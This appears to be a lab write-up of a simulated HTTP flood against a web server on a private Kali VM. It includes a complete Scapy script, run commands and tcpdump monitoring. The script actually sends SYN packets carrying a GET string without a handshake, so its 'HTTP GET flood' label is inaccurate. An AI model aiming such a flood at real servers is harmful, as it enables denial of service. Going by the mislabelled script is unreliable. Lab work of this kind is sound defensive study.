# HTTP Flood Attack Simulation

This documentation provides an overview of an HTTP flood attack simulation conducted using Scapy and tcpdump. The simulation targets a web server running on a Kali Linux VM, with traffic generated from an Ubuntu VM.

## Overview

The objective of this simulation is to generate a high volume of HTTP GET requests aimed at a web server hosted on a Kali Linux VM. The traffic is generated from an Ubuntu VM using a custom Python script with Scapy. Since Suricata isn't capturing the logs, `tcpdump` is utilized to monitor and capture the HTTP traffic on the network interface.

## Setup

### Environment

- **Target Machine (Kali Linux VM)**
  - IP Address: `192.168.100.50`
  - Web Server: Python's `http.server` module on port `80`
  
- **Attack Machine (Ubuntu VM)**
  - Script: Python script using Scapy to perform HTTP GET flood

### Web Server Configuration

On the Kali Linux VM, start the web server using Python:

```bash
sudo python3 -m http.server 80
```

![h1](https://github.com/user-attachments/assets/7703dab9-df05-4b79-a039-7c4ba9f7c544)


### Traffic Capturing
On the Kali Linux VM, use tcpdump to capture HTTP traffic on the network interface:

```bash

sudo tcpdump -i eth0 port 80
```

![h2](https://github.com/user-attachments/assets/deb952a0-a63e-4e2d-8c91-2743dda3f843)


## Attack Script
The attack script is designed to send multiple HTTP GET requests to the target server.

**Script: http_flood.py**
```python

from scapy.all import *
import time

target_ip = "192.168.100.50"  # Replace with the IP of your Kali Linux VM
target_port = 80              # Port 80 for HTTP
num_requests = 1000           # Adjust the number of requests as needed

# Craft the HTTP GET request payload
http_payload = (
    "GET / HTTP/1.1\r\n"
    "Host: " + target_ip + "\r\n"
    "User-Agent: Scapy\r\n"
    "Connection: keep-alive\r\n\r\n"
)

# Function to send HTTP GET requests with logging
def send_http_flood():
    for i in range(1, num_requests + 1):
        # Build the IP and TCP layers
        ip = IP(dst=target_ip)
        tcp = TCP(dport=target_port, flags="S")  # SYN flag
        packet = ip/tcp/http_payload  # Combine layers with payload

        # Send the packet
        send(packet, verbose=0)

        # Print information about the packet being sent
        print(f"Sent packet {i}/{num_requests} to {target_ip}:{target_port}")

# Execute the flood with a start and end message
if __name__ == "__main__":
    print(f"Starting HTTP flood attack on {target_ip}:{target_port} with {num_requests} requests...")
    send_http_flood()
    print("HTTP flood attack completed.")
```
### How to Run the Script
1. Ensure that the target web server is running on the Kali Linux VM.
2. Run the **http_flood.py** script on the Ubuntu VM:

```bash

sudo python3 http_flood.py
```


 https://github.com/user-attachments/assets/8c61478c-59d9-4784-90fe-5158293bb450



3. Observe the traffic using **tcpdump** on the Kali Linux VM.

## Traffic Monitoring
To monitor the incoming HTTP flood traffic, use the following command on the Kali Linux VM:

```bash
sudo tcpdump -i eth0 port 80
```
This command captures and displays the HTTP traffic on the specified interface, allowing for analysis of the attack's impact.


![h3](https://github.com/user-attachments/assets/abce8cc3-ae59-43ad-9099-fa1bdb59874e)
![h4](https://github.com/user-attachments/assets/e973c7f5-4d10-4600-a3d5-08df6a74180e)


## Conclusion
This simulation demonstrates a basic HTTP flood attack using Scapy. It highlights the process of generating high volumes of HTTP GET requests and capturing the resulting traffic using tcpdump. This method can be used for testing and understanding the impact of such attacks on web servers.

## Contributions
Contributions to this project are not welcome. 
